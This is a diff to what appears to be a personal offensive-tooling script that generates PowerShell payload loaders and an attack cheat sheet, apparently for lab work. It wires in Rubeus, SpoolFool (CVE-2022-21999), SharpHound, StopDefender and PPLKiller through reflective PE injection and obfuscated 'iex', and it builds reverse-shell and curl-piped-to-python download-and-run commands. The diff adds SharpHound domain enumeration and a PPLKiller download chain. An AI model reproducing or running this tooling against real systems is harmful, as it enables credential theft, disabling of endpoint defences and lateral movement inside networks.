@@ -411,7 +411,7 @@ def pandora(Tname, shellUrl=shellcode_url, Tvar=None, desc=None, pscmdType='raw'
 def simple(filepath, desc=None):
     desc = desc or filepath
     command = 'curl %s' % TempUtil.getFileUrl(filepath)
-    wlmgr.add(desc, '', command)
+    wlmgr.add('[Simple] %s' % desc, '', command)
 
 def c_exe(filepath, desc, _type='enc', _args='$null'):
     # TODO: _args
@@ -419,8 +419,14 @@ def c_exe(filepath, desc, _type='enc', _args='$null'):
             import_reflect=dict(url=TempUtil.getFileUrl('Invoke-ReflectivePEInjection.ps1', encFn), var='ii', \
             postCode='[System.Text.Encoding]::ASCII.GetString($ii) | `i`e`x; $exeArgs=%s;' % _args)), desc=desc)
 
-def cs_exe(filepath, desc):
-    pandora('load-exe-1', shellUrl=TempUtil.getFileUrl(filepath, encFn), desc=desc)
+def cs_exe(filepath, desc, classname=None, funcname=None):
+    _func = os.path.splitext(os.path.basename(filepath))[0]
+    classname = classname or ('%s.Program' % _func)
+    funcname = funcname or ('Invoke-%s' % _func)
+    pandora('load-exe-1', shellUrl=TempUtil.getFileUrl(filepath, encFn), desc=desc, Tvar={
+        'class': classname,
+        'function': funcname
+    })
 
 def ez_fit(filepath, **tvar):
     for k in tvar:
@@ -447,9 +453,12 @@ pandora('vb-1')
 cs_exe('Rubeus.exe', 'Rubeus')
 cs_exe('../challenges/1/122/SpoolSample.exe', 'SpoolSample')
 cs_exe('SpoolFool.exe', 'SpoolFool (CVE-2022-21999)')
-cs_exe('myPsExec.exe', '[myPsExec.Program]::MainString("appsrv01 SensorDataService powershell -ep bypass -c `"iwr ...`"")')
-cs_exe('csexec.exe', '[csexec.Program]::MainString("\\\\<target> cmd") [Failed]')
-cs_exe('SQL.exe', '[SQL.SQL]::Main(@("<servername>", "<sql>")) # separator = `n')
+cs_exe('../csharp/myPsExec.exe', '[myPsExec.Program]::MainString("appsrv01 SensorDataService powershell -ep bypass -c `"iwr ...`"")', 
+        'myPsExec.Program', 'Invoke-mPsExec')
+#cs_exe('csexec.exe', '[csexec.Program]::MainString("\\\\<target> cmd") [Failed]')
+cs_exe('SQL.exe', '[SQL.SQL]::Main(@("<servername>", "<sql>")) # separator = `n', 'SQL.SQL')
+cs_exe('SharpHound.exe', '[SharpHound.Program]::Main(@("-c", "All,GPOLocalGroup", "--outputdirectory", "$env:tmp", "-s"))', 
+        'SharpHound.Program', 'Invoke-Bloodhound')
 
 c_exe('StopDefender.exe', 'StopDefender')
 #c_exe('./artifact/PrintSpoofer.exe', 'PrintSpoofer.exe')
@@ -470,6 +479,7 @@ pandora('c-1')
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python3'), desc='curl + Python3')
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python'), desc='curl + Python')
 
+pandora('ppl-1', Tvar=dict(pplkiller_dl=wlmgr.getCmd(desc1='[Simple] PPLKiller.exe')), useTransform=False, FILENAME='pk.ps1')
 
 if args.revport:
     data = ez_fit('reverse/rev.ps1', ip=args.ip, port=args.revport)
@@ -544,6 +554,7 @@ C payload transformer
 \tcurl "http://127.0.0.1:8787/%(payload)s?ip=%(ip)s&port=%(rport)s&chain=%(chain)s&o=c"
 ''' % dict(ip=args.ip, port=args.port, rport=args.rport, payload=args.payload, chain=args.chain)
 
+wlmgr.sort()
 print(oBanner)
 print(wlmgr)
 wlmgr.export_cheatsheet()
